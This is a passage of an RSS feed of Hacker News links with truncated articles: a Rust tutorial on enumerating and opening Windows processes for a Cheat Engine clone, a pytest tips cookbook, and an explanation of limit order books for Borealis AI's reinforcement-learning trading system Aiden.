<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>2021-02-07</p><p>last updated 2021-02-19</p></div><p>This is part 1 on the <em>Writing our own Cheat Engine</em> series:</p><ul><li>Part 1: Introduction</li><li><a href="https://lonami.dev/blog/woce-2">Part 2: Exact Value scanning</a></li><li><a href="https://lonami.dev/blog/woce-3">Part 3: Unknown initial value</a></li></ul><p><a href="https://cheatengine.org/">Cheat Engine</a> is a tool designed to modify single player games and contains other useful tools within itself that enable its users to debug games or other applications. It comes with a memory scanner, (dis)assembler, inspection tools and a handful other things. In this series, we will be writing our own tiny Cheat Engine capable of solving all steps of the tutorial, and diving into how it all works underneath.</p><p>Needless to say, we're doing this for private and educational purposes only. One has to make sure to not violate the EULA or ToS of the specific application we're attaching to. This series, much like cheatengine.org, does not condone the illegal use of the code shared.</p><p>Cheat Engine is a tool for Windows, so we will be developing for Windows as well. However, you can also <a href="https://stackoverflow.com/q/12977179/4759433">read memory from Linux-like systems</a>. <a href="https://github.com/scanmem/scanmem">GameConqueror</a> is a popular alternative to Cheat Engine on Linux systems, so if you feel adventurous, you could definitely follow along too! The techniques shown in this series apply regardless of how we read memory from a process. You will learn a fair bit about doing FFI in Rust too.</p><p>We will be developing the application in Rust, because it enables us to interface with the Windows API easily, is memory safe (as long as we're careful with <code>unsafe</code>!), and is speedy (we will need this for later steps in the Cheat Engine tutorial). You could use any language of your choice though. For example, <a href="https://lonami.dev/blog/ctypes-and-windows/">Python also makes it relatively easy to use the Windows API</a>. You don't need to be a Rust expert to follow along, but this series assumes some familiarity with C-family languages. Slightly advanced concepts like the use of <code>unsafe</code> or the <code>MaybeUninit</code> type will be briefly explained. What a <code>fn</code> is or what <code>let</code> does will not be explained.</p><p><a href="https://github.com/cheat-engine/cheat-engine/">Cheat Engine's source code</a> is mostly written in Pascal and C. And it's <em>a lot</em> of code, with a very flat project structure, and files ranging in the thousand lines of code each. It's daunting<sup><a href="#1">1</a></sup>. It's a mature project, with a lot of knowledge encoded in the code base, and a lot of features like distributed scanning or an entire disassembler. Unfortunately, there's not a lot of comments. For these reasons, I'll do some guesswork when possible as to how it's working underneath, rather than actually digging into what Cheat Engine is actually doing.</p><p>With that out of the way, let's get started!</p><h2 id="welcome-to-the-cheat-engine-tutorial">Welcome to the Cheat Engine Tutorial</h2><details open=""><summary>Cheat Engine Tutorial: Step 1</summary> <blockquote><p>This tutorial will teach you the basics of cheating in video games. It will also show you foundational aspects of using Cheat Engine (or CE for short). Follow the steps below to get started.</p><ol><li>Open Cheat Engine if it currently isn't running.</li><li>Click on the "Open Process" icon (it's the top-left icon with the computer on it, below "File".).</li><li>With the Process List window now open, look for this tutorial's process in the list. It will look something like &gt; "00001F98-Tutorial-x86_64.exe" or "0000047C-Tutorial-i386.exe". (The first 8 numbers/letters will probably be different.)</li><li>Once you've found the process, click on it to select it, then click the "Open" button. (Don't worry about all the &gt; other buttons right now. You can learn about them later if you're interested.)</li></ol><p>Congratulations! If you did everything correctly, the process window should be gone with Cheat Engine now attached to the &gt; tutorial (you will see the process name towards the top-center of CE).</p><p>Click the "Next" button below to continue, or fill in the password and click the "OK" button to proceed to that step.)</p><p>If you're having problems, simply head over to forum.cheatengine.org, then click on "Tutorials" to view beginner-friendly &gt; guides!</p></blockquote></details><h2 id="enumerating-processes">Enumerating processes</h2><p>Our first step is attaching to the process we want to work with. But we need a way to find that process in the first place! Having to open the task manager, look for the process we care about, noting down the process ID (PID), and slapping it in the source code is not satisfying at all. Instead, let's enumerate all the processes from within the program, and let the user select one by typing its name.</p><p>From a quick <a href="https://ddg.gg/winapi%20enumerate%20all%20processes">DuckDuckGo search</a>, we find an official tutorial for <a href="https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes">Enumerating All Processes</a>, which leads to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses"><code>EnumProcesses</code></a> call. Cool! Let's slap in the <a href="https://crates.io/crates/winapi"><code>winapi</code></a> crate on <code>Cargo.toml</code>, because I don't want to write all the definitions by myself:</p><pre><code data-lang="toml">[dependencies]
winapi = { version = "0.3.9", features = ["psapi"] }
</code></pre><p>Because <a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses"><code>EnumProcesses</code></a> is in <code>Psapi.h</code> (you can see this in the online page of its documentation), we know we'll need the <code>psapi</code> crate feature. Another option is to search for it in the <a href="https://docs.rs/winapi/"><code>winapi</code> documentation</a> and noting down the parent module where its stored.</p><p>The documentation for the method has the following remark:</p><blockquote><p>It is a good idea to use a large array, because it is hard to predict how many processes there will be at the time you call <strong>EnumProcesses</strong>.</p></blockquote><p><em>Sidenote: reading the documentation for the methods we'll use from the Windows API is extremely important. There's a lot of gotchas involved, so we need to make sure we're extra careful.</em></p><p>1024 is a pretty big number, so let's go with that:</p><pre><code data-lang="rust">use std::io;
use std::mem;
use winapi::shared::minwindef::{DWORD, FALSE};

pub fn enum_proc() -&gt; io::Result&lt;Vec&lt;u32&gt;&gt; {
    let mut pids = Vec::&lt;DWORD&gt;::with_capacity(1024);
    let mut size = 0;
    // SAFETY: the pointer is valid and the size matches the capacity.
    if unsafe {
        winapi::um::psapi::EnumProcesses(
            pids.as_mut_ptr(),
            (pids.capacity() * mem::size_of::&lt;DWORD&gt;()) as u32,
            &amp;mut size,
        )
    } == FALSE
    {
        return Err(io::Error::last_os_error());
    }

    todo!()
}
</code></pre><p>We allocate enough space<sup><a href="#2">2</a></sup> for 1024 <code>pids</code> in a vector<sup><a href="#3">3</a></sup>, and pass a mutable pointer to the contents to <code>EnumProcesses</code>. Note that the size of the array is in <em>bytes</em>, not items, so we need to multiply the capacity by the size of <code>DWORD</code>. The API likes to use <code>u32</code> for sizes, unlike Rust which uses <code>usize</code>, so we need a cast.</p><p>Last, we need another mutable variable where the amount of bytes written is stored, <code>size</code>.</p><blockquote><p>If the function fails, the return value is zero. To get extended error information, call <a href="https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror"><code>GetLastError</code></a>.</p></blockquote><p>That's precisely what we do. If it returns false (zero), we return the last OS error. Rust provides us with <a href="https://doc.rust-lang.org/stable/std/io/struct.Error.html#method.last_os_error"><code>std::io::Error::last_os_error</code></a>, which essentially makes that same call but returns a proper <code>io::Error</code> instance. Cool!</p><blockquote><p>To determine how many processes were enumerated, divide the <em>lpcbNeeded</em> value by <code>sizeof(DWORD)</code>.</p></blockquote><p>Easy enough:</p><pre><code data-lang="rust">let count = size as usize / mem::size_of::&lt;DWORD&gt;();
// SAFETY: the call succeeded and count equals the right amount of items.
unsafe { pids.set_len(count) };
Ok(pids)
</code></pre><p>Rust doesn't know that the memory for <code>count</code> items were initialized by the call, but we do, so we make use of the <a href="https://doc.rust-lang.org/stable/std/vec/struct.Vec.html#method.set_len"><code>Vec::set_len</code></a> call to indicate this. The Rust documentation even includes a FFI similar to our code!</p><p>Let's give it a ride:</p><pre><code data-lang="rust">fn main() {
    dbg!(enum_proc().unwrap().len());
}
</code></pre><pre><code>&gt;cargo run
   Compiling memo v0.1.0
    Finished dev [unoptimized + debuginfo] target(s) in 0.20s
     Running `target\debug\memo.exe`
[src\main.rs:27] enum_proc().unwrap().len() = 178
</code></pre><p>It works! But currently we only have a bunch of process identifiers, with no way of knowing which process they refer to.</p><blockquote><p>To obtain process handles for the processes whose identifiers you have just obtained, call the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess"><code>OpenProcess</code></a> function.</p></blockquote><p>Oh!</p><h2 id="opening-a-process">Opening a process</h2><p>The documentation for <code>OpenProcess</code> also contains the following:</p><blockquote><p>When you are finished with the handle, be sure to close it using the <a href="https://lonami.dev/blog/woce-1/closehandle"><code>CloseHandle</code></a> function.</p></blockquote><p>This sounds to me like the perfect time to introduce a custom <code>struct Process</code> with an <code>impl Drop</code>! We're using <code>Drop</code> to cleanup resources, not behaviour, so it's fine. <a href="https://internals.rust-lang.org/t/pre-rfc-leave-auto-trait-for-reliable-destruction/13825">Using <code>Drop</code> to cleanup behaviour is a bad idea</a>. But anyway, let's get back to the code:</p><pre><code data-lang="rust">use std::ptr::NonNull;
use winapi::ctypes::c_void;

pub struct Process {
    pid: u32,
    handle: NonNull&lt;c_void&gt;,
}

impl Process {
    pub fn open(pid: u32) -&gt; io::Result&lt;Self&gt; {
        todo!()
    }
}

impl Drop for Process {
    fn drop(&amp;mut self) {
        todo!()
    }
}
</code></pre><p>For <code>open</code>, we'll want to use <code>OpenProcess</code> (and we also need to add the <code>processthreadsapi</code> feature to the <code>winapi</code> dependency in <code>Cargo.toml</code>). It returns a <code>HANDLE</code>, which is a nullable mutable pointer to <code>c_void</code>. If it's null, the call failed, and if it's non-null, it succeeded and we have a valid handle. This is why we use Rust's <a href="https://doc.rust-lang.org/stable/std/ptr/struct.NonNull.html"><code>NonNull</code></a>:</p><pre><code data-lang="rust">// SAFETY: the call doesn't have dangerous side-effects.
NonNull::new(unsafe { winapi::um::processthreadsapi::OpenProcess(0, FALSE, pid) })
    .map(|handle| Self { pid, handle })
    .ok_or_else(io::Error::last_os_error)
</code></pre><p><code>NonNull</code> will return <code>Some</code> if the pointer is non-null. We map the non-null pointer to a <code>Process</code> instance with <code>Self { .. }</code>. <code>ok_or_else</code> converts the <code>Option</code> to a <code>Result</code> with the error builder function we provide if it was <code>None</code>.</p><p>The first parameter is a bitflag of permissions we want to have. For now, we can leave it as zero (all bits unset, no specific permissions granted). The second one is whether we want to inherit the handle, which we don't, and the third one is the process identifier. Let's close the resource handle on <code>Drop</code> (after adding <code>handleapi</code> to the crate features):</p><pre><code data-lang="rust">// SAFETY: the handle is valid and non-null.
unsafe { winapi::um::handleapi::CloseHandle(self.handle.as_mut()) };
</code></pre><p><code>CloseHandle</code> can actually fail (for example, on double-close), but given our invariants, it won't. You could add an <code>assert!</code> to panic if this is not the case.</p><p>We can now open processes, and they will be automatically closed on <code>Drop</code>. Does any of this work though?</p><pre><code data-lang="rust">fn main() {
    let mut success = 0;
    let mut failed = 0;
    enum_proc().unwrap().into_iter().for_each(|pid| match Process::open(pid) {
        Ok(_) =&gt; success += 1,
        Err(_) =&gt; failed += 1,
    });

    eprintln!("Successfully opened {}/{} processes", success, success + failed);
}
</code></pre><pre><code>&gt;cargo run
   Compiling memo v0.1.0
    ‚Ä¶</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lonami.dev/blog/woce-1/">https://lonami.dev/blog/woce-1/</a></em></p>]]>
            </description>
            <link>https://lonami.dev/blog/woce-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193563</guid>
            <pubDate>Fri, 19 Feb 2021 14:36:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Quick and Dirty Pytest Cookbook]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193533">thread link</a>) | @felipez
<br/>
February 19, 2021 | https://blog.esciencecenter.nl/a-quick-and-dirty-pytest-cookbook-58051a2980c3 | <a href="https://web.archive.org/web/*/https://blog.esciencecenter.nl/a-quick-and-dirty-pytest-cookbook-58051a2980c3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@f.zapata?source=post_page-----58051a2980c3--------------------------------" rel="noopener"><img alt="Felipe" src="https://miro.medium.com/fit/c/96/96/1*f7WZ93VZ5pv2qgIxOhxJUA.jpeg" width="48" height="48"></a></p></div></div></div></div><p id="bdc9"><a href="https://docs.pytest.org/en/stable/" rel="noopener">Pytest</a> has become the standard tool to test python code. In this post I will show you several tricks and hacks to create, configure and run your tests. without further ado, let‚Äôs eat the bugs!</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4490/1*H0EmQizVVc4_BG8gYWl1sw.jpeg" width="2245" height="3636" srcset="https://miro.medium.com/max/552/1*H0EmQizVVc4_BG8gYWl1sw.jpeg 276w, https://miro.medium.com/max/1104/1*H0EmQizVVc4_BG8gYWl1sw.jpeg 552w, https://miro.medium.com/max/1280/1*H0EmQizVVc4_BG8gYWl1sw.jpeg 640w, https://miro.medium.com/max/1400/1*H0EmQizVVc4_BG8gYWl1sw.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/38/1*H0EmQizVVc4_BG8gYWl1sw.jpeg?q=20"></p></div></div></div><figcaption>Image by Chiara Caratelli</figcaption></figure><p id="0955">Since I don‚Äôt want to burden my users with testing dependencies, I usually put all the test and documentation dependencies in the <a href="https://extras-require.readthedocs.io/en/latest/" rel="noopener">extra_require</a> section of th<em>e </em><strong><em>setup.py</em></strong> file, like:</p><pre><span id="bc0e">extras_require={<br> "test": ["coverage", "mypy", "pycodestyle", "pytest", "pytest-cov",<br> "pytest-mock", "pytest-asyncio"]}</span></pre><p id="2464">In this way, when I am developing code, I can install these testing dependencies like:</p><pre><span id="5972">pip install -e .[test]</span></pre><p id="4cfb">I also like to configure Pytest to automatically look for the tests folder and generate a coverage report. For doing so, I add the following lines in the <a href="https://docs.python.org/3/distutils/configfile.html" rel="noopener">configuration <em>setup.cfg</em></a> file:</p><pre><span id="5bf7">[tool:pytest]<br>testpaths = tests<br>addopts = --cov --cov-report xml --cov-report term --cov-report html</span></pre><p id="4e04">I use<a href="https://docs.github.com/en/actions/quickstart" rel="noopener"> GitHub actions</a> to tests my Python code. The following snippet defines the commands that I use to install and run the Pytest dependencies:</p><pre><span id="2cdc">- name: Install the library<br>        run: |<br>          pip install -e .[test]</span><span id="458d">- name: Test<br>        run: |<br>          pytest --cov-config setup.cfg</span><span id="cf4a">- name: coverage<br>        uses: codecov/codecov-action@v1<br>        with:<br>          file: ./coverage.xml<br>          name: codecov-umbrella</span></pre><p id="3b63">The final action takes the automatically generated coverage and send it to <a href="https://github.com/codecov/codecov-action" rel="noopener">codecov</a>. Pretty neat, right?</p><p id="1d19">Sometimes you find yourself wanting to get a temporal folder to write output files from your server, simulation, etc. in order to check that things are going as expected. The following snippet shows you how to do so:</p><figure><div></div></figure><p id="d38e">Notice that <code>tmp_path</code> is an argument provided automatically by Pytest. You just need to use it in your code.</p><p id="6558"><a href="https://mock.readthedocs.io/en/latest/" rel="noopener">Mocking functionality</a> is a cool trick when you need to test expensive or complex code, like calling a web service.</p><p id="dfbb">Let‚Äôs suppose that I have a command line interface to interact with a web service and I will like to test its behavior. I would first mock the reading of the user‚Äôs arguments by <a href="https://docs.python.org/3/library/argparse.html" rel="noopener">argparse</a>, then I would mock the expensive or complex functionality, like calling a web service. The following snippet shows how you can do so:</p><figure><div></div></figure><p id="5394">Notice that the <code>mocker</code> argument is automatically injected by Pytest. For more information check the <a href="https://pypi.org/project/pytest-mock/" rel="noopener">pytest-mock page</a>.</p><p id="a7d8">A common pattern when testing is to mock part of the functionality, while writing some output to a file. For doing so, you use both a <em>mocker</em> object and a <em>temporal file</em>, like:</p><figure><div></div></figure><p id="4faf">Testing that an exception is raised helps to check that your code functionality behaves as expected, for example when the wrong arguments are passed or the user runs into a corner case. The following snippet allows you to test that behavior:</p><figure><div></div></figure><p id="6b08">Sometimes is very useful to skip a test if a dependency is not present at runtime. Maybe the dependency takes a lot of time to install in the CI or it is a proprietary package that you cannot install easily. You can skip those tests with the following snippet:</p><figure><div></div></figure><p id="fcb2">I personally love to use <a href="https://docs.python.org/3/library/typing.html" rel="noopener">type hints</a> in my functions and methods. I use <a href="http://mypy-lang.org/" rel="noopener">mypy</a> to check that those types make sense. the following snippet presents the configuration that I use to call <a href="http://mypy-lang.org/" rel="noopener">mypy</a> on a package.</p><figure><div></div></figure><p id="b608">Notice that you need to define a <a href="https://mypy.readthedocs.io/en/stable/config_file.html" rel="noopener">mypy.ini</a> file somewhere in your repository ( I put that file inside the <em>tests</em> folder). I also prefer that the mypy raises some warnings if there are issues with the types instead of raising a (very annoying) error.</p><p id="6f44">As an alternative to the above snippet, you can install and run the <a href="https://pypi.org/project/pytest-mypy-plugins/" rel="noopener">pytest-mypy-plugins</a>.</p><p id="a23a">Testing the documentation is a must have. The following snippet shows how you can do so:</p><figure><div></div></figure><p id="3422">If you do web applications or something similar you probably have run into Python <a href="https://docs.python.org/3/library/asyncio.html" rel="noopener">asyncio</a>. If you try to run async code using normal pytest code, chances are that you wouldn‚Äôt notice that there are no tests running at all. <em>Async code is lazy and requires that you run it inside an async block</em>, otherwise nothing interesting happens. The following snippet shows how to invoke async code in Pytest:</p><figure><div></div></figure><p id="278f">For more details about testing asynchronous code in python check <a href="https://github.com/pytest-dev/pytest-asyncio" rel="noopener">pytest-asyncio</a>.</p><p id="4004">If you, like me, have the tendency to procrastinate while waiting for the test suite to finish executing, then a good way to reduce the procrastination time is to run the tests in parallel.</p><p id="08d5">For running your tests in parallel, you just need to install the <a href="https://github.com/browsertron/pytest-parallel" rel="noopener">pytest-parallel</a> library that not only allows you to run your tests in parallel but also in a thread-safe manner, using commands as simple as:</p><pre><span id="63e2">pytest --workers 2</span></pre><p id="e2c8">Imaging that you have a simulation that receives some parameters as input and gives you back some numerical output. You can use <a href="https://docs.pytest.org/en/stable/parametrize.html" rel="noopener">pytest‚Äôs parametrize extension</a> to feed one parameter at a time to the simulation and check that each one of them returns the expected output. The following snippet shows how to accomplish that:</p><figure><div></div></figure><p id="658b">If you run the previous snippet, you should see something like:</p><pre><span id="843e">pytest -v test_parameters.py<br>test_parameters.py::test_simulation[pi-3.141592653589793] PASSED                                      <br>test_parameters.py::test_simulation[exp-2.718281828459045] FAILED</span><span id="9c2b">parameter = 'exp', expected = 2.718281828459045</span><span id="5b28"><a href="http://twitter.com/pytest" rel="noopener">@pytest</a>.mark.parametrize("parameter, expected", <br>                         [("pi", np.pi), ("exp", np.exp(1))])<br>    def test_simulation(parameter: str, expected: float) -&gt; None:<br>        """Check the simulation."""<br>        result = run_simulation(parameter)<br>&gt;       assert abs(result - expected) &lt; 1e-8<br>E       assert 39.28171817154095 &lt; 1e-08<br>E        +  where 39.28171817154095 = abs((42 - 2.718281828459045))</span><span id="8d88">test_parameter.py:16: AssertionError</span></pre><p id="69bf">Pytest is a flexible tool with a great number of useful extensions. With Pytest, there is always a way to check your code functionality, even those annoying corner cases.</p><p id="95eb">Please comment if you find these tricks useful or if you find another nice trick that you want to share.</p><p id="dec1">My special gratitude to Bas van Beek to share with me some of his useful recipes. I would like also to thank </p><p> and Stefan Verhoeven for their feedback.</p><p id="f625">Thanks to </p><p> and Steven Roldan for their help editing the text.</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.esciencecenter.nl/a-quick-and-dirty-pytest-cookbook-58051a2980c3</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193533</guid>
            <pubDate>Fri, 19 Feb 2021 14:33:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CC Academy (Free Fellowship) opens its doors to the 3rd cohort of ML/FE/UX folks]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26193517">thread link</a>) | @billnyetheai
<br/>
February 19, 2021 | https://www.notion.so/Chronic-Coder-Academy-Season-3-dbd4a42c517a4902b345a7fb7287cedf | <a href="https://web.archive.org/web/*/https://www.notion.so/Chronic-Coder-Academy-Season-3-dbd4a42c517a4902b345a7fb7287cedf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Chronic-Coder-Academy-Season-3-dbd4a42c517a4902b345a7fb7287cedf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193517</guid>
            <pubDate>Fri, 19 Feb 2021 14:31:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Of Emotional Machines and Irrational Men]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193452">thread link</a>) | @datashrimp
<br/>
February 19, 2021 | https://adsp.ai/articles/of-emotional-machines-and-irrational-men/ | <a href="https://web.archive.org/web/*/https://adsp.ai/articles/of-emotional-machines-and-irrational-men/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://adsp.ai/articles/of-emotional-machines-and-irrational-men/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193452</guid>
            <pubDate>Fri, 19 Feb 2021 14:24:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Aiden: Reinforcement Learning Applied to Electronic Trading]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193416">thread link</a>) | @flooo
<br/>
February 19, 2021 | https://www.borealisai.com/en/blog/aiden-reinforcement-learning-for-order-execution/ | <a href="https://web.archive.org/web/*/https://www.borealisai.com/en/blog/aiden-reinforcement-learning-for-order-execution/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>This article describes a system&nbsp;called&nbsp;<a href="https://www.rbccm.com/en/expertise/electronic-trading/ai-trading.page?utm_source=rbc&amp;utm_medium=va&amp;utm_campaign=aiden" target="_blank">Aiden</a>,&nbsp;developed jointly by <a href="https://www.rbccm.com/en/home.page" target="_blank">RBC Capital Markets</a>&nbsp;and <a href="https://www.borealisai.com/en/" target="_blank">Borealis AI</a>. At a high level, Aiden aims to solve&nbsp;the following problem:&nbsp;a customer indicates that they wish to buy or sell a certain number of units of an asset and it is the broker‚Äôs responsibility to execute this order within a specified time window, seeking prices that minimize loss relative to a specified benchmark.&nbsp; For simplicity of exposition this article is restricted to the former case (buy orders).</p>

<p>This execution problem sounds straightforward but there are several complications. A naive approach might be to wait until the price seems "low enough"&nbsp;and then buy all the shares at once.&nbsp;Putting aside the question of how to&nbsp;define "low enough",&nbsp;this method has a huge drawback. Executing a large order all at once creates a great deal of demand and the effect of this is to increase the price (market impact). Unfortunately, this&nbsp;action has an undesirable effect on the final price achieved.&nbsp;Consequently, it could be more sensible to buy the shares gradually through the specified time period.&nbsp;But how many should the broker&nbsp;buy, and when?</p>

<p>To the savvy machine learning researcher, it will be obvious that this problem lends itself to a reinforcement learning formulation.&nbsp;The execution algorithm must make a series of sequential decisions about how many shares to buy at each time step and receives rewards in the form of low execution prices.&nbsp;</p>

<p>The structure of the rest of this article is as follows.&nbsp;First, we describe&nbsp;the order execution problem in more detail. This will necessitate a discussion of how modern financial markets work in practice and the limit order book.&nbsp;Then we&nbsp;provide&nbsp;a brief review of reinforcement learning and describe&nbsp;how it maps to this problem. Finally, we describe the practical details of the Aiden system.</p>

<h2>Limit order markets</h2>

<p>Contemporary financial markets such as the TSX/NYSE/NASDAQ are <em>limit order markets</em>.&nbsp;This means that traders who wish to purchase shares can specify not only the volume they wish to purchase, but also the maximum price (limit<em>)</em>&nbsp;that they are prepared to pay. More formally, a <em>limit order</em>&nbsp;can be specified by the tuple $\{\tau, p, n\}$ where $\tau\in\{0,1\}$ specifies whether this is a buy or sell order, $p$ is the specified price limit, and $n$ is the maximum number of shares to be&nbsp;traded.&nbsp;The possible prices of the shares in the order book are discrete, and the smallest difference allowable between them is a <em>tick</em>.&nbsp;</p>

<p>The <em>limit order book</em>&nbsp;consists of the set of all current limit orders.&nbsp;It can be visualized as two histograms (figure 1).&nbsp;The first consists of the volume of the buy orders at each discrete price level and the second consists of volumes of the sell orders.&nbsp;The highest buy order is known as the current <em>bid</em>&nbsp;price and the lowest sell order is known as the current <em>ask</em>&nbsp;price.&nbsp;The difference between the two is known as the <em>bid-ask spread</em>&nbsp;and the average of the two is known as the <em>mid-price</em>.</p>

<p>








<img src="https://www.borealisai.com/media/filer_public_thumbnails/filer_public/d4/19/d419ba84-f0fe-41e1-9ef8-8863406f98dc/aiden_figure1.png__6000x3750_q85_subject_location-3000%2C1871_subsampling-2.png" alt="Limit order book. The limit order book contains information about current buy and sell orders at each discrete price level or tick. The buy orders are indicated by green bars and the sell orders are indicated by blue bars. In each case, the horizontal position of the bar indicates the price and the height of the bar represents the volume. In a single market scenario, the ranges of the two histograms are always non-overlapping; if they were not then the buy and sell prices would match and a transaction would occur. The highest price offered to buy shares is known as the bid price and the lowest price offered to sell is known as the ask price. The distance between these prices (and hence between the histograms) is known as the bid-ask spread. The average of these two prices is termed the mid-price and can be thought of as the current price of the asset.">



        <span>Figure 1. Limit order book. The limit order book contains information about current buy and sell orders at each discrete price level or tick. The buy orders are indicated by green bars and the sell orders are indicated by blue bars. In each case, the horizontal position of the bar indicates the price and the height of the bar represents the volume. In a single market scenario, the ranges of the two histograms are always non-overlapping; if they were not then the buy and sell prices would match and
a transaction would occur. The highest price offered to buy shares is known as the bid price and the lowest price offered to sell is known as the ask price. The distance between these prices (and hence between the histograms) is known as the bid-ask spread. The average of these two prices is termed the mid-price and can be thought of as the current price of the asset.</span>





 </p>

<h2><small>Limit orders</small></h2>

<p>When a trader enters a buy limit order that is at or above the current ask price, the order will receive executions. The first trades will occur at the current ask price, but if the volume of the buy order exceeds the volume available at that price, the order will continue at the next price level. This process occurs until either the entire order has been fulfilled, or it reaches&nbsp;the specified limit.&nbsp;In this case, there are insufficient shares available for sale at or below this limit and so the order is only partially filled.&nbsp;Hence, the overall effect of placing a limit order is that the price is guaranteed to be within the specified limit, but the volume is not.</p>

<p>Any remaining unfulfilled part of the order is then added to the buy side of the limit order book and remains there until it is either (i) matched by a new sell-side order (ii) its time limit expires or (iii) it is removed by the trader. Orders are typically matched based on a first-in / first-out basis for most trading venues; in this instance,&nbsp;any order placed below the current ask price will be placed last in the queue for that particular price level. A worked example of a limit order is given in figure 2.</p>

<p>








<img src="https://www.borealisai.com/media/filer_public_thumbnails/filer_public/44/3e/443e75f5-7783-441c-9ae9-4b6bd5c7a285/aiden_figure2.png__6000x3750_q85_subject_location-3000%2C1871_subsampling-2.png">



        <span>Figure 2. Limit order example. Starting with the situation in figure 1, a buy order is placed for 1750 shares with a limit of 166.01, meaning that this is the maximum price the trader is prepared to pay for them. This order is first matched with the lowest possible price and 500 shares are bought at a price of 166.00 (represented by left-most pale blue bar). This leaves 1250 unfulfilled units in the buy order. The next lowest price (166.01) is also within the limit and so we also purchase all of the 250 shares at this level (represented by right-most pale blue bar). This leaves 1000 unfulfilled units in the buy order. Unfortunately, the next price on the sell side is above the specified limit and so no further transactions occur at this time. The remaining order for 1000 shares is entered into the limit order book (rightmost green bar). Note that the effect of this is that both the bid and ask prices increase and hence so does the mid-price. Placing this aggressive order increases the effective price of the asset.</span>





 </p>

<h2><small>Market orders</small></h2>

<p>In addition to limit orders it is possible to place a <em>market order</em>&nbsp;which is specified by the volume $n$ of shares that we wish to buy. Essentially, this means that the trader will buy all $n$ shares now at whatever prices are available on the sell side of the limit order book.&nbsp;So first the trader buys shares at the current ask price. If the volume of the buy order exceeds the volume available at the current ask price, the trader will continue fulfilling the order at the next best price and so on.&nbsp;Effectively, a market order is hence a limit order where the limit is $+\infty$.&nbsp;A worked example of a market order is given in figure 3.</p>

<p>








<img src="https://www.borealisai.com/media/filer_public_thumbnails/filer_public/6b/32/6b32a4e5-a60d-4efb-9377-623ebbefe9c2/aiden_figure3.png__6000x3750_q85_subject_location-3000%2C1871_subsampling-2.png">



        <span>Figure 3. Market order example. Starting with the situation in figure 1, the trader places a market buy order for 2250 shares. To fulfil this order, they first look to the lowest possible sell price of 166.00 and since there are only 500 units for sale at this price, they buy all of them (leftmost pale blue bar). The trader continues in this way, buying all of the units at prices 166.01 and 166.02. The volume for sale at 166.03 is sufficient to fulfil the remaining part of the order and some shares are left for sale at this level which becomes the new ask price. Hence, after a market buy order, the ask price increases, but the bid price remains the same. It follows that the bid-ask spread and the mid-price must both increase. Once more, the demand created by the order causes the effective price to inflate.</span>





 </p>

<h2><small>Market impact of orders</small></h2>

<p>Notice that for both the limit order and the market order, a large volume affects the current ask price.&nbsp;As the volume at one price level is exhausted the ask price increases to the next level where there is non-zero volume. Hence, by placing a large volume buy order, ceteris paribus, it&nbsp;may have a large impact on the market and the mid-price (a proxy for current stock price) correspondingly increases.&nbsp;</p>

<h2>Order execution</h2>

<p>Now that limit order book has been explained, let's return to the problem of order execution.&nbsp;The goal is to buy a known volume $V$ of shares within a given time window $[0,T]$. This is typically referred to as the parent order (or meta order). At each time step $0\leq t &lt; T$ the trader can place a limit order,&nbsp;remove an existing limit order, or place a market order by tranching parts of the meta order into smaller parts (child orders) as to minimize market impact. As the trader reaches the end of the execution timeframe, they can make use of more aggressively priced orders to complete their order, potentially at a higher cost.</p>

<h2><small>Market micro-structure data</small></h2>

<p>How can a trader&nbsp;decide which action to take at each time step?&nbsp;Electronic markets release in real-time the contents of the limit order book and the trader can use this data as a basis for their&nbsp;decisions.&nbsp;Such <em>market micro-structure data</em>&nbsp;comes in two different resolutions which are referred to as level I and level II data respectively.&nbsp;Level I data includes the current bid price and associated volume, the current ask price and associated volume and the price and volume of the last transaction.&nbsp;Level II data includes more details about the contents of the limit order book; for example, it might include the top ten current bid and ask orders and their associated volumes.</p>

<p>It's clear that this market micro-structure data contains clues about when it might be a good idea to place an order.&nbsp;For example, if the ask-price is decreasing over time, it might be worth using this <em>momentum</em>&nbsp;signal to delay buying shares. Similarly, if there is a lot more volume on the sell side than the buy side of the limit order book then this gives an insight into the current levels of supply and demand and this may similarly affect the&nbsp;decision to execute an order at this time or not. In addition, the time stamp and ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.borealisai.com/en/blog/aiden-reinforcement-learning-for-order-execution/">https://www.borealisai.com/en/blog/aiden-reinforcement-learning-for-order-execution/</a></em></p>]]>
            </description>
